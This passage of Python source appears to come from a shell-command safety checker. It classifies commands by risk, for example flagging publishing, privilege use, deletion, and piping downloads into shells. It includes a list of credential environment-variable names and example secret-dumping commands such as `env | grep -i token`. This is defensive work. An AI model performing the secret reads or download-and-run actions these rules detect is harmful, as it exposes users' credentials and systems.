    if program in NETWORK_READERS:
        network_leak(program, argv, ctx, stdin)
        if not any(f.cls == "egress-secret" for f in ctx.findings):
            ctx.add("egress", f"Looks up a network address ({program}).")
        return Stage()
    if pattern_first and stdin is not None and stdin.environ:  # `env | grep -i token` (#139)
        patterns = values(opts, "-e", "--regexp") or pos[:1]
        if any(SECRET_VAR.search(p) or picks_secret_var(p) for p in patterns):
            ctx.add("secret-read", f"Picks the variables that look like secrets out of the environment "
                                   f"({program}) and prints them into the conversation.")
    if pattern_first and pos and not has(opts, "-e", "--regexp", "-f", "--file"):
        pos = pos[1:]
    if program not in ("fd", "fdfind", "file"):
        read_paths(values(opts, "-f", "--file"), ctx)
    if kind == "text":
        if program == "printenv":
            for name in pos:
                if SECRET_VAR.search(name):
                    ctx.add("secret-read", f"Prints ${name}, which looks like a secret, into the "
                                           f"conversation.")
            if not pos:
                ctx.add("exec", "Prints the environment (it can hold secrets).")
                return Stage(environ=True)
        ctx.add("read", f"Only shows information ({program}).")
        if program in PRINTERS and not any(UNKNOWN in a for a in argv[1:]):
            text = " ".join(a for a in argv[1:] if not (program == "echo" and a in ("-n", "-e", "-E")))
            return Stage(text=text.replace("\\n", "\n") if program == "printf" else text)
        return Stage(secret=joined_marks(argv[1:]).__contains__("secret"))
    if not pos:
        ctx.add("read", f"Only shows information ({program}).")
        if stdin is not None:
            return Stage(text=stdin.text if program in ("cat", "tac") else None, downloads=stdin.downloads,
                         secret=stdin.secret)
        if program in ("ls", "fd", "fdfind", "tree"):
            return Stage(paths_root=ctx.cwd, filtered=program != "ls")
        return Stage()
    read_paths(pos, ctx, "reads" if kind == "read" else "looks at", meta=kind == "meta")
    if program in ("ls", "fd", "fdfind", "tree"):
        root = ctx.where.resolve(pos[-1], ctx.cwd) if program in ("ls", "tree") else ctx.cwd
        return Stage(paths_root=root, filtered=program != "ls")
    return Stage()


# Variables that setup-node, npm, gh and the cloud CLIs put in the environment with a secret in them (#215).
SECRET_ENV_NAMES = ("npm_token", "node_auth_token", "npm_config__authtoken",
                    "npm_config_//registry.npmjs.org/:_authtoken", "github_token", "gh_token",
                    "gh_enterprise_token", "gitlab_token",
                    "aws_secret_access_key", "aws_session_token", "aws_access_key_id",
                    "azure_client_secret", "google_application_credentials", "anthropic_api_key",
                    "openai_api_key", "docker_password", "twine_password", "pypi_token", "codecov_token",
                    "heroku_api_key", "slack_token", "vercel_token", "netlify_auth_token")


def picks_secret_var(pattern: str) -> bool:
    """`env | grep -i npm` lets NPM_TOKEN through: a piece of the pattern is part of a secret's name."""
    for piece in re.split(r"\\?\|", pattern.lower()):
        piece = re.sub(r"[\\^$()\[\]?*+{}]|=.*", "", piece).strip()
        if len(piece) >= 3 and any(piece in name for name in SECRET_ENV_NAMES):
            return True
    return False


def jq_args(argv: list[Arg]) -> list[Arg]:
    """jq's --arg/--argjson take two values and --slurpfile/--rawfile read a file."""
    out, i = [argv[0]], 1
    while i < len(argv):
        a = argv[i]
        if a in ("--args", "--jsonargs"):
            break
        if a in ("--arg", "--argjson", "--slurpfile", "--rawfile"):
            if a in ("--slurpfile", "--rawfile") and i + 2 < len(argv):
                out += [arg("-f"), argv[i + 2]]
            i += 3
            continue
        out.append(a)
        i += 1
    return out


# ---------------------------------------------------------------- project runs

RUNNERS = {"pytest", "py.test", "tox", "nox", "mypy", "pyright", "ruff", "black", "isort", "flake8", "pylint",
           "coverage", "jest", "vitest", "mocha", "tsc", "eslint", "prettier", "biome", "stylelint", "rspec",
           "phpunit", "shellcheck", "hadolint", "actionlint", "yamllint", "markdownlint", "codespell",
           "pre-commit", "ctest", "ninja", "karma", "ava", "playwright", "cypress", "golangci-lint",
           "staticcheck", "swiftlint", "ktlint", "detekt", "rubocop", "standardrb", "pyflakes", "bandit",
           "vulture", "pydocstyle", "nx", "turbo", "lerna", "phpstan", "psalm", "clang-format", "clang-tidy",
           "cppcheck", "tflint", "sqlfluff", "taplo", "next", "vite", "webpack", "rollup", "esbuild", "tsx",
           "ts-node", "nodemon", "storybook"}
RUN_WORDS = {"test", "tests", "t", "tst", "check", "lint", "build", "typecheck", "type-check", "format",
             "fmt", "verify", "compile", "vet", "clippy", "bench", "doc", "coverage", "dev", "start", "serve",
             "preview", "watch", "e2e", "validate", "analyze", "test:unit", "test:e2e", "storybook"}
RELEASE_WORDS = re.compile(r"(?i)(deploy|publish|release|upload|push|install|uninstall|destroy|prod|ship)")


def project_run(ctx: Ctx, reason: str) -> Stage:
    if ctx.in_project():
        ctx.add("run", reason)
    else:
        ctx.add("exec", reason.replace(" in the project", "") + " (outside the project)")
    return Stage()


def h_make(argv, ctx, stdin):
    goals = [a for a in argv[1:] if not a.startswith("-") and "=" not in a]
    if any(RELEASE_WORDS.search(g) for g in goals):
        ctx.add("exec", f"Runs `{argv[0]} {' '.join(goals)}`, which may install or publish something.")
        return Stage()
    return project_run(ctx, f"Runs {argv[0]} {' '.join(goals) or '(default target)'} in the project.")


YARN_OTHER = {"add", "remove", "install", "upgrade", "up", "dlx", "exec", "config", "set", "plugin", "init",
              "create", "global", "link", "unlink", "pack", "npm", "workspace", "workspaces", "cache",
              "import",
              "patch", "patch-commit", "rebuild", "unplug", "constraints", "dedupe", "node", "policies",
              "publish", "version", "why", "info", "list", "outdated", "audit", "help", "bin"}


def h_node_pm(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-w", "--workspace", "--filter", "-C", "--prefix", "--dir", "--cwd",
                                   "-L", "--location", "--userconfig"})
    sub = pos[0] if pos else "install"
    rest = pos[1:]
    if sub in ("publish", "unpublish", "deprecate", "owner", "dist-tag", "access", "team") or \
            (sub == "npm" and rest[:1] == ["publish"]):
        if has(opts, "--dry-run"):
            ctx.add("exec", f"`{program} {sub} --dry-run` only shows what it would send; nothing reaches the "
                            "registry.")
            return Stage()
        ctx.add("remote-irreversible", f"`{program} {sub}` changes a package on the public registry, which "
                                       "others download; it is hard or impossible to take back.")
        return Stage()
    if sub in ("run", "run-script", "rs") and rest:
        script = rest[0]
        if RELEASE_WORDS.search(script) and script not in RUN_WORDS:
            ctx.add("exec", f"Runs the project script `{script}`, which may publish or deploy.")
            return Stage()
        return project_run(ctx, f"Runs the project script `{script}` in the project.")
    if sub in RUN_WORDS or (program == "yarn" and sub not in YARN_OTHER and pos):
        if RELEASE_WORDS.search(sub) and sub not in RUN_WORDS:
            ctx.add("exec", f"Runs the project script `{sub}`, which may publish or deploy.")
            return Stage()
        return project_run(ctx, f"Runs `{program} {sub}` in the project.")
    if not pos and has(opts, "--version", "-v"):
        ctx.add("read", f"Only shows information ({program} --version).")
        return Stage()
    if sub in ("ls", "list", "ll", "la", "outdated", "view", "info", "why", "explain", "show", "root", "bin",
               "prefix", "help", "-v", "audit", "doctor", "search", "query", "licenses", "whoami", "ping") \
            or (sub == "pkg" and rest[:1] == ["get"]) \
            or has(opts, "--version", "-v"):
        if sub == "audit" and "fix" in rest:
            ctx.add("exec", f"`{program} audit fix` changes the project's dependencies.")
        else:
            ctx.add("read", f"Only shows information ({program} {sub}{' get' if sub == 'pkg' else ''}).")
        return Stage()
    turned_off = rest[1:2] == ["ignore-scripts"] and (rest[0] in ("delete", "rm") or rest[2:3] == ["false"]) \
        or rest[1:2] == ["ignore-scripts=false"]
    if sub in ("config", "c") and rest[:1] and rest[0] in ("set", "delete", "rm") and turned_off:
        ctx.add("risky", IGNORE_SCRIPTS_OFF_REASON.format(path=f"{program}'s config"))
        return Stage()
    if sub in ("exec", "x", "dlx") and rest:
        return npx([arg("npx"), *rest], ctx, stdin)
    if sub in ("config", "c") and rest[:1] and rest[0] in ("get", "list", "ls"):
        ctx.add("read", f"Shows {program} settings.")
        return Stage()
    if sub in ("config", "c") and rest[:1] and rest[0] in ("set", "delete", "rm", "edit", "fix"):
        return npm_config_write(program, rest[0], opts, ctx)
    ctx.add("exec", f"Runs `{program} {sub}` (installs or changes packages).")
    return Stage()


def npm_config_write(program: str, verb: str, opts: list, ctx: Ctx) -> Stage:
    """`npm config set` writes the user's ~/.npmrc (or the project's, or the global one): judged as that
    write, since ~/.npmrc holds the registry tokens (#216)."""
    location = str((values(opts, "-L", "--location") or [arg("user")])[-1])
    if has(opts, "-g", "--global"):
        location = "global"
    if program == "yarn":
        target = "~/.yarnrc.yml" if has(opts, "-H", "--home") else ".yarnrc.yml"
    elif values(opts, "--userconfig"):
        target = values(opts, "--userconfig")[-1]
    elif location == "project":
        target = os.path.join(ctx.where.root, ".npmrc")
    elif location == "global":
        ctx.add("write-outside", f"`{program} config {verb}` changes the global npmrc, outside the project.")
        return Stage()
    else:
        target = os.environ.get("NPM_CONFIG_USERCONFIG") or "~/.npmrc"
    write_paths([arg(target)], ctx, f"`{program} config {verb}` writes to")
    return Stage()


# A package spec that is a URL or a git repository rather than a registry name (#220): npx runs its code.
GIT_SOURCE = re.compile(r"(?i)^(?:https?://|git\+|git://|ssh://|(?:github|gitlab|bitbucket|gist):"
                        r"|[\w.-]+/[\w.-]+(?:#\S*)?$)")


def npx(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-p", "--package", "-c", "--call", "--from", "--with"}, first_stops=True)
    calls = values(opts, "-c", "--call")
    if calls:
        return shell_string(calls[0], ctx, [], f"{argv[0]} -c")
    if not pos:
        ctx.add("exec", f"Runs {argv[0]}.")
        return Stage()
    sources = [str(v) for v in values(opts, "-p", "--package", "--from", "--with")] + [str(pos[0])]
    fetched = next((v for v in sources if GIT_SOURCE.match(v)), None)
    if fetched:
        ctx.add("download-run", f"Downloads {fetched} (a URL or git repository, not a registry package) and "
                                "runs its code at once, without you seeing it first.")
        return Stage()
    name = pos[0]
    tool = name.rsplit("@", 1)[0] if name.count("@") > (1 if name.startswith("@") else 0) else name
    tool = os.path.basename(tool)
    if os.path.exists(os.path.join(ctx.where.root, "node_modules", ".bin", tool)) or tool in RUNNERS:
        return run([arg(tool), *pos[1:]], ctx, stdin)
    if tool in HOOK_INSTALLERS:
        return hook_installer(tool, [arg(tool), *pos[1:]], ctx)
    ctx.add("exec", f"Downloads {name} and runs it.")
    if tool in NODE_DELETERS:  # what it deletes is judged like `rm -r` (#264)
        return run([arg(tool), *pos[1:]], ctx, stdin)
    return Stage()


NODE_DELETERS = {"rimraf", "del-cli", "del", "shx"}


def h_shx(argv, ctx, stdin):
    """shx runs shelljs's versions of the shell commands: `shx rm -rf x` deletes like `rm -rf x`."""
    rest = argv[1:]
    while rest and rest[0].startswith("-"):
        rest = rest[1:]
    if not rest:
        ctx.add("exec", f"Runs {argv[0]}.")
        return Stage()
    return run(rest, ctx, stdin)


def h_pip(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-r", "-c", "-e", "-t", "--target", "--index-url", "-i", "--python"})
    sub = pos[0] if pos else ""
    if sub in ("list", "show", "freeze", "check", "help", "search", "inspect", "debug", "index") or \
            has(opts, "--version", "-V"):
        ctx.add("read", f"Only shows information ({argv[0]} {sub}).")
    else:
        ctx.add("exec", f"Runs `{argv[0]} {sub}` (installs or removes packages).")
    return Stage()


def h_runner_wrapper(argv, ctx, stdin):
    """uv, poetry, pipenv, pdm, hatch, rye, bundle, conda ...: `X run CMD` runs CMD."""
    program = argv[0]
    opts, pos = options(argv[1:], {"-n", "--name", "-p", "--prefix", "--python", "--with", "--env", "-e",
                                   "--project", "--directory", "--group", "--extra", "--package", "-r",
                                   "--repository", "-u", "--username", "--token"}, first_stops=True)
    sub = pos[0] if pos else ""
    if sub in ("run", "exec") and len(pos) > 1:
        rest = pos[1:]
        while rest and rest[0].startswith("-"):
            rest = rest[1:]
        return run(rest, ctx, stdin)
    publishes = sub == "publish" or (program == "twine" and sub == "upload")
    if publishes or (program == "gem" and sub in ("push", "yank")):
        ctx.add("remote-irreversible", f"`{program} {sub}` publishes a package for everyone to download; "
                                       "it cannot really be taken back.")
        return Stage()
    if sub == "pip":
        return h_pip([arg("pip"), *pos[1:]], ctx, stdin)
    if sub in ("show", "list", "tree", "check", "info", "version", "--version", "config", "env") and \
            program not in ("conda",):
        ctx.add("read", f"Only shows information ({program} {sub}).")
        return Stage()
    if sub in RUN_WORDS:
        return project_run(ctx, f"Runs `{program} {sub}` in the project.")
    ctx.add("exec", f"Runs `{program} {sub}` (changes the environment or packages).")
    return Stage()


def h_build_tool(argv, ctx, stdin):
    """cargo, go, dotnet, mvn, gradle, swift, zig, deno, flutter, dart, bazel, cmake, mix ..."""
    program = argv[0]
    opts, pos = options(argv[1:], {"-p", "--package", "-C", "--manifest-path", "-c", "--configuration",
                                   "--project", "-f", "--framework", "-o", "--output", "-s", "--settings"})
    sub = pos[0] if pos else ""
    words = {p.lower() for p in pos}
    if program == "cargo" and sub in ("publish", "yank", "owner"):
        ctx.add("remote-irreversible", f"`cargo {sub}` changes a crate on crates.io for everyone; it "
                                       f"cannot be "
                                       "taken back.")
    elif program == "dotnet" and sub == "nuget" and words & {"push", "delete"}:
        ctx.add("remote-irreversible", "Publishes or removes a NuGet package for everyone.")
    elif program == "dotnet" and sub == "ef" and "drop" in words:
        ctx.add("remote-irreversible", "Deletes the database (`dotnet ef database drop`).")
    elif program in ("mvn", "mvnw", "gradle", "gradlew") and any(RELEASE_WORDS.search(w) for w in words
                                                                  if w not in RUN_WORDS):
        ctx.add("remote-irreversible", f"`{program} {' '.join(pos)}` deploys or publishes the project.")
    elif program == "deno" and sub == "eval" and len(pos) > 1:
        return code_check(pos[1], ctx, "deno eval", "js")
    elif program == "deno" and sub == "run" and "-" in pos:
        return interpreter_stdin(program, ctx, stdin, "js")
    elif program == "go" and sub == "run" and any(p.startswith(("http",
                                                                "github.com")) and "@" in p for p in pos):
        ctx.add("exec", "Downloads a Go program and runs it.")
    elif sub in RUN_WORDS or sub in ("run", "nextest", "tree", "metadata", "env", "list", "version",
                                     "package",
                                     "assemble", "--info", "--version", "info", "help", "outdated") \
            or (program == "cmake" and has(opts, "--build")):
        return project_run(ctx, f"Runs `{program} {sub}` in the project.")
    else:
        ctx.add("exec", f"Runs `{program} {sub}`.")
    return Stage()


def h_terraform(argv, ctx, stdin):
    program = argv[0]
    pos = [a for a in argv[1:] if not a.startswith("-")]
    sub = pos[0] if pos else ""
    if sub in ("apply", "destroy", "import", "taint", "force-unlock") or \
            (sub == "state" and pos[1:2] and pos[1] in ("rm", "mv", "push")) or \
            (sub == "workspace" and "delete" in pos):
        ctx.add("remote-irreversible", f"`{program} {sub}` changes or destroys real infrastructure.")
    elif sub in ("validate", "fmt"):
        return project_run(ctx, f"Runs `{program} {sub}` in the project.")
    elif sub in ("show", "version", "providers", "graph", "output"):
        ctx.add("read", f"Only shows information ({program} {sub}).")
    else:
        ctx.add("exec", f"Runs `{program} {sub}`.")
    return Stage()


# ---------------------------------------------------------------- shell builtins and wrappers


def h_cd(argv, ctx, stdin):
    target = argv[1] if len(argv) > 1 and argv[1] != "--" else None
    if argv[0] == "popd" or target == "-":
        ctx.cwd = None
    elif target is None:
        if argv[0] == "cd":
            ctx.cwd = ctx.where.home
    else:
        ctx.cwd = ctx.where.resolve(target, ctx.cwd)
    ctx.add("read", "Changes the current folder.")
    return Stage()


def h_export(argv, ctx, stdin):
    program = argv[0]
    flags = "".join(a[1:] for a in argv[1:] if a.startswith("-") and not a.startswith("--"))
    names = [a for a in argv[1:] if not a.startswith(("-", "+"))]
    if program == "alias":
        defined = [a for a in names if "=" in a]
        for a in defined:  # judged where the same command uses it (#225)
            name, _, body = a.partition("=")
            ctx.aliases[name] = body
        if defined:
            ctx.add("exec", "Defines an alias, which runs nothing by itself (a later use in this command is "
                            "checked).")
        else:
            ctx.add("read", "Shows aliases.")
        return Stage()
    if program == "unalias":
        for a in names:
            ctx.aliases.pop(a, None)
        ctx.add("read", "Removes aliases.")
        return Stage()
    if not names and "f" not in flags and "F" not in flags:
        ctx.add("exec", "Prints the environment (it can hold secrets).")
        return Stage(environ=True)
    for a in names:
        name, eq, value = a.partition("=")
        name = name.rstrip("+")
        if eq:
            ctx.vars[name] = UNKNOWN if ("n" in flags or a[len(name)] == "+") else value
            if name in RISKY_ENV:
                ctx.add("risky", f"Setting {name} changes which code later programs load or run.")
        elif program not in ("export", "readonly") or "n" in flags:
            ctx.vars[name] = UNKNOWN if "n" in flags else ""
    ctx.add("read", "Sets variables.")
    return Stage()


def h_set(argv, ctx, stdin):
    if argv[0] == "shift":
        n = int(argv[1]) if len(argv) > 1 and argv[1].isdigit() else 1
        if ctx.args is not None:
            ctx.args = ctx.args[:1] + ctx.args[1 + n:]
        ctx.add("read", "Shifts the arguments.")
        return Stage()
    if len(argv) == 1:
        ctx.add("exec", "Prints the environment (it can hold secrets).")
        return Stage(environ=True)
    _, pos = options(argv[1:], {"-o", "+o"})
    if "--" in argv[1:] or pos:
        ctx.args = [ctx.args[0] if ctx.args else "", *(str(a) for a in pos)]
    ctx.add("read", "Changes shell settings.")
    return Stage()


def h_trap(argv, ctx, stdin):
    opts, pos = options(argv[1:])
    if pos and not has(opts, "-l", "-p"):
        return shell_string(pos[0], ctx, [], "trap")
    ctx.add("read", "Shows traps.")
    return Stage()


def shell_string(script: Arg, ctx: Ctx, args: list, via: str) -> Stage:
    """Commands given as text (bash -c, eval, su -c, watch, ssh ...): parse and check them too."""
    if UNKNOWN in script:
        if "download" in getattr(script, "marks", ()):
            ctx.add("download-run", f"`{via}` runs code it downloads, without you seeing it first.")
        else:
            ctx.add("dynamic", f"`{via}` runs commands that are only known when it runs, so haris cannot "
                               "check them.")
        return Stage()
    inner = ctx.child()
    inner.args = [str(a) for a in args]
    try:
        walk(shell.parse(str(script), min(ctx.depth // 2, shell.MAX_DEPTH)), inner)
    except shell.ParseError as exc:
        ctx.add("unparsed", f"haris could not read the commands given to `{via}` ({exc}).")
    return Stage()


def interpreter_stdin(program: str, ctx: Ctx, stdin: Stage | None, lang: str = "sh") -> Stage:
    if stdin is None:
        ctx.add("exec", f"Starts {program}.")
    elif stdin.downloads:
        ctx.add("download-run", f"Pipes a download straight into {program}: it runs code from the internet "
                                "without you seeing it first.")
    elif stdin.text is not None:
        if lang == "sh":
            return shell_string(arg(stdin.text), ctx, [program], program)
        return code_check(arg(stdin.text), ctx, program, lang)
    else:
        ctx.add("dynamic", f"{program} runs what is piped into it, which haris cannot see.")
    return Stage()


def h_shell(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-o", "-O", "+o", "--rcfile", "--init-file"}, first_stops=True)
    if has(opts, "-c"):
        if not pos:
            ctx.add("unparsed", f"`{program} -c` is missing its commands.")
            return Stage()
        return shell_string(pos[0], ctx, pos[1:], f"{program} -c")
    if has(opts, "--version", "--help"):
        ctx.add("read", f"Shows {program} information.")
        return Stage()
    if pos and not has(opts, "-s") and pos[0] not in STDIN_FILES:
        return script_run(program, pos[0], ctx)
    return interpreter_stdin(program, ctx, stdin)


STDIN_FILES = {"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"}  # `sh -` reads its script from stdin


def h_eval(argv, ctx, stdin):
    stage = shell_string(arg(" ".join(argv[1:]), joined_marks(argv[1:])), ctx, [], "eval")
    ctx.forget(args=True)
    return stage


def h_source(argv, ctx, stdin):
    if len(argv) < 2:
        ctx.add("unparsed", f"`{argv[0]}` is missing its file.")
        return Stage()
    path = ctx.where.resolve(argv[1], ctx.cwd) if UNKNOWN not in argv[1] else None
    if path and ctx.where.place(path) == "secret" and not path.startswith(PLUGIN_ROOT + "/"):
        ctx.add("secret-read", f"Loads {ctx.show(path)}, which holds secrets (keys, tokens or passwords), "
                               "into the shell.", path)
        ctx.forget(args=True)
        return Stage()
    stage = script_run(argv[0], argv[1], ctx, "in this shell")
    ctx.forget(args=True)
    return stage


WRAPPERS = {
    # name: (options that take a value, positionals to skip before the command)
    "nice": ({"-n", "--adjustment"}, 0), "ionice": ({"-c", "-n", "-p", "-P", "-u", "--class",
                                                     "--classdata"}, 0),
    "chrt": ({"-T", "-P", "-D"}, 1), "taskset": ({"-p"}, 1), "nohup": (set(), 0), "setsid": (set(), 0),
    "stdbuf": ({"-i", "-o", "-e", "--input", "--output", "--error"}, 0), "time": ({"-f", "-o"}, 0),
    "timeout": ({"-s", "-k", "--signal", "--kill-after"}, 1), "gtimeout": ({"-s", "-k"}, 1),
    "command": (set(), 0), "builtin": (set(), 0), "exec": ({"-a"}, 0), "caffeinate": ({"-t", "-w"}, 0),
    "unbuffer": (set(), 0), "xvfb-run": ({"-n", "-s", "-f", "-e", "-p"}, 0), "catchsegv": (set(), 0),
    "strace": ({"-e", "-o", "-p", "-s", "-u", "-E", "-a", "-b", "-I", "-O", "-S", "-X", "-P"}, 0),
    "ltrace": ({"-e", "-o", "-p", "-s", "-u", "-n", "-a"}, 0), "proxychains": ({"-f"}, 0),
    "proxychains4": ({"-f"}, 0), "torsocks": (set(), 0), "firejail": (set(), 0), "unshare": (set(), 0),
    "valgrind": (set(), 0), "busybox": (set(), 0), "dotenv": ({"-e", "-c", "-v"}, 0),
    "env-cmd": ({"-f", "-e"}, 0), "doppler": (set(), 0), "op": (set(), 0),
}


def h_wrapper(argv, ctx, stdin):
    program = argv[0]
    with_arg, skip = WRAPPERS[program]
    if program in ("doppler", "op"):
        if len(argv) > 1 and argv[1] == "run" and "--" in argv:
            return run(argv[argv.index("--") + 1:], ctx, stdin)
        return h_secret_cli(argv, ctx, stdin)
    if program == "command" and len(argv) > 1 and argv[1] in ("-v", "-V"):
        ctx.add("read", "Looks up a command.")
        return Stage()
    if program == "busybox" and len(argv) > 1 and argv[1] in SHELLS:
        return h_shell(argv[1:], ctx, stdin)
    opts, pos = options(argv[1:], with_arg, first_stops=True)
    if program == "time":
        write_paths(values(opts, "-o"), ctx)
    pos = pos[skip:]
    if not pos:
        ctx.add("read" if program in ("time", "command", "builtin", "nohup", "exec") else "exec",
                f"Runs {program} without a command.")
        return Stage()
    return run(pos, ctx, stdin)


def h_env(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-u", "--unset", "-C", "--chdir", "-S", "--split-string", "-P"},
                        first_stops=True)
    for value in values(opts, "-C", "--chdir"):
        ctx = ctx.child()
        ctx.cwd = ctx.where.resolve(value, ctx.cwd)
    split = values(opts, "-S", "--split-string")
    while pos and re.match(r"^[A-Za-z_]\w*=", pos[0]):
        name = pos[0].split("=", 1)[0]
        if name in RISKY_ENV:
            ctx.add("risky", f"Setting {name} changes which code the next program loads or runs.")
        pos = pos[1:]
    if split:
        return shell_string(arg(split[0] + " " + " ".join(shquote(p) for p in pos), split[0].marks), ctx, [],
                            "env -S")
    if not pos:
        ctx.add("exec", "Prints the environment (it can hold secrets).")
        return Stage(environ=True)
    return run(pos, ctx, stdin)


def shquote(value: str) -> str:
    return "'" + str(value).replace("'", "'\\''") + "'"


def h_sudo(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T", "--user",
                                   "--group", "--host", "--prompt", "--chdir", "--role", "--type",
                                   "--other-user", "--close-from", "--command-timeout"}, first_stops=True)
    if not pos and has(opts, "-l", "-v", "-k", "-K", "--list", "--validate", "-V", "--version"):
        ctx.add("read", f"Only shows {program} information.")
        return Stage()
    ctx.add("privileged", f"Runs with administrator rights ({program}): a mistake can damage the whole "
                          f"system.")
    if pos:
        run(pos, ctx, stdin)
    return Stage()


def h_su(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-c", "--command", "-s", "--shell", "-g", "-G", "-w"})
    ctx.add("privileged", "Switches to another user (often the administrator).")
    cmd = values(opts, "-c", "--command")
    if cmd:
        return shell_string(cmd[0], ctx, [], "su -c")
    return Stage()


def h_watch(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-n", "--interval", "-d", "--differences"}, first_stops=True)
    if not pos:
        ctx.add("read", "watch without a command.")
        return Stage()
    if has(opts, "-x", "--exec"):
        return run(pos, ctx, stdin)
    return shell_string(arg(" ".join(pos), joined_marks(pos)), ctx, [], "watch")


def h_flock(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-w", "-E", "--timeout", "--conflict-exit-code", "-c", "--command"},
                        first_stops=True)
    cmd = values(opts, "-c", "--command")
    if cmd:
        return shell_string(cmd[0], ctx, [], "flock -c")
    if len(pos) > 1:
        return run(pos[1:], ctx, stdin)
    ctx.add("read", "Takes a lock.")
    return Stage()


def h_chroot(argv, ctx, stdin):
    ctx.add("privileged", f"Runs a command in another root folder or namespace ({argv[0]}); this needs "
                          "administrator rights.")
    opts, pos = options(argv[1:], {"--userspec", "--groups", "-t", "--target"}, first_stops=True)
    if len(pos) > 1:
        run(pos[1:], ctx, stdin)
    return Stage()


def h_xargs(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-I", "-L", "-l", "-n", "-P", "-s", "-d", "-E", "-e", "-a", "--arg-file",
                                   "--delimiter", "--max-args", "--max-procs", "--replace", "--max-lines",
                                   "--eof", "--max-chars"}, first_stops=True)
    read_paths(values(opts, "-a", "--arg-file"), ctx)
    inner = pos or [arg("echo")]
    if stdin is not None and stdin.text is not None:
        items = [arg(w) for w in stdin.text.split()] or [arg("")]
    elif stdin is not None and stdin.paths_root is not None:
        items = [arg(stdin.paths_root.rstrip("/") + "/_" if stdin.filtered else stdin.paths_root)]
    else:
        items = [arg(UNKNOWN)]
    secret = bool(stdin and stdin.secret)
    if secret:
        items = [arg(i, {"secret"}) for i in items]
    replace = values(opts, "-I", "--replace")
    if replace or has(opts, "-i"):
        token = replace[0] if replace else "{}"
        argv2 = [arg(a.replace(token, items[0]),
                     a.marks | items[0].marks) if token in a else a for a in inner]
    else:
        argv2 = inner + items
    return run(argv2, ctx, Stage(secret=secret))


FIND_FILTERS = {"-name", "-iname", "-path", "-ipath", "-regex", "-iregex", "-type", "-newer", "-mtime",
                "-mmin",
                "-atime", "-amin", "-ctime", "-cmin", "-size", "-empty", "-perm", "-user", "-group",
                "-wholename", "-iwholename", "-links", "-inum", "-samefile", "-lname", "-ilname", "-uid",
                "-gid",
                "-nouser", "-nogroup", "-xtype", "-readable", "-writable", "-executable", "-newermt"}


def h_find(argv, ctx, stdin):
    args = list(argv[1:])
    while args and (args[0] in ("-H", "-L", "-P") or args[0].startswith("-O")):
        args = args[1:]
    roots: list[Arg] = []
    while args and not (args[0].startswith("-") or args[0] in ("(", "!", ")", ",")):
        roots.append(args.pop(0))
    roots = roots or [arg(".")]
    filtered = any(a in FIND_FILTERS for a in args)
    found = [arg(r.rstrip("/") + "/_" if filtered else r) for r in roots]
    read_paths(roots, ctx, "lists files in", meta=True)
    i = 0
    while i < len(args):
        a = args[i]
        if a == "-delete":
            delete_paths(found, ctx)
        elif a in ("-exec", "-execdir", "-ok", "-okdir"):
            j = i + 1
            while j < len(args) and args[j] not in (";", "+"):
                j += 1
            inner = args[i + 1:j]
            if not inner:
                ctx.add("unparsed", f"`find {a}` is missing its command.")
            else:
                replaced: list[Arg] = []
                for word in inner:
                    if "{}" in word:
                        replaced += [arg(word.replace("{}", f), word.marks) for f in found]
                    else:
                        replaced.append(word)
                run(replaced, ctx, None)
            i = j
        elif a in ("-fprint", "-fprint0", "-fls", "-fprintf") and i + 1 < len(args):
            write_paths([args[i + 1]], ctx)
            i += 1
        i += 1
    return Stage(paths_root=ctx.where.resolve(roots[0], ctx.cwd), filtered=filtered)


# ---------------------------------------------------------------- files


def h_rm(argv, ctx, stdin):
    opts, pos = options(argv[1:])
    if has(opts, "--no-preserve-root"):
        ctx.add("destroy", "Turns off the protection that stops `rm` from deleting the whole disk.")
    if not pos:
        ctx.add("read", f"{argv[0]} without files does nothing.")
        return Stage()
    delete_paths(pos, ctx, "trashes" if argv[0].startswith("trash") else "deletes")
    return Stage()


def h_shred(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-n", "-s", "--iterations", "--size", "--random-source"})
    delete_paths(pos, ctx, "destroys")
    return Stage()


def h_mv(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-t", "--target-directory", "-S", "--suffix"})
    dest = values(opts, "-t", "--target-directory")
    if dest:
        sources, target = pos, dest[0]
    elif len(pos) >= 2:
        sources, target = pos[:-1], pos[-1]
    else:
        ctx.add("unparsed", f"`{argv[0]}` is missing a source or a target.")
        return Stage()
    if argv[0] == "mv":
        delete_paths(sources, ctx, "moves away")
    else:
        read_paths(sources, ctx, "copies")
    tpath = ctx.where.resolve(target, ctx.cwd)
    if tpath and os.path.isdir(tpath) and not has(opts, "-T", "--no-target-directory"):
        inside = [arg(tpath + "/" + os.path.basename(s.rstrip("/"))) for s in sources if UNKNOWN not in s]
        write_paths(inside or [target], ctx, "puts a file at")
    else:
        write_paths([target], ctx, "puts a file at")
    return Stage()


def h_ln(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-t", "--target-directory", "-S", "--suffix"})
    if values(opts, "-t", "--target-directory"):
        write_paths(values(opts, "-t", "--target-directory"), ctx, "creates links in")
    elif len(pos) >= 2:
        write_paths([pos[-1]], ctx, "creates a link at")
    elif pos:
        write_paths([arg(os.path.basename(pos[0]))], ctx, "creates a link at")
    return Stage()


def h_touch(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-d", "-t", "-r", "--date", "--reference"})
    write_paths(pos, ctx, "creates")
    return Stage()


def h_tee(argv, ctx, stdin):
    opts, pos = options(argv[1:])
    write_paths(pos, ctx, "appends to" if has(opts, "-a", "--append") else "writes to")
    return Stage(text=stdin.text if stdin else None, secret=bool(stdin and stdin.secret))


def h_install(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-m", "-o", "-g", "-t", "-S", "--mode", "--owner", "--group",
                                   "--target-directory", "--suffix"})
    if has(opts, "-d", "--directory"):
        write_paths(pos, ctx, "creates")
    elif values(opts, "-t", "--target-directory"):
